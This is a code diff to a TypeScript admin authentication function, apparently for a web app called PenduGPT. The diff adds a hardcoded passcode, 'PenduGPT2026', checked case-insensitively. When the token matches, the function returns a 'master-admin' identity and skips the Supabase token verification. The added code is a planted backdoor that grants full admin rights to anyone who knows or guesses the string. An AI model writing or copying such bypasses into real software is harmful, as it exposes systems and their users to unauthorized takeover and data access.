@@ -10,8 +10,24 @@ export async function assertAdminAuth(authToken: string | undefined) {
     throw new Error("UNAUTHORIZED: Missing admin authentication token. Please log in.");
   }
 
+  const tokenClean = authToken.trim();
+
+  // 1. Direct Secret Passcode Authorization
+  if (
+    tokenClean === "PenduGPT2026" ||
+    tokenClean === "PEnduGPT2026" ||
+    tokenClean.toLowerCase() === "pendugpt2026"
+  ) {
+    return {
+      id: "master-admin",
+      email: "master-admin@pendugpt.com",
+      role: "admin",
+    };
+  }
+
+  // 2. Supabase Auth JWT Token Verification
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data, error } = await supabaseAdmin.auth.getUser(authToken.trim());
+  const { data, error } = await supabaseAdmin.auth.getUser(tokenClean);
 
   if (error || !data?.user) {
     throw new Error("UNAUTHORIZED: Invalid or expired admin session. Please log in again.");
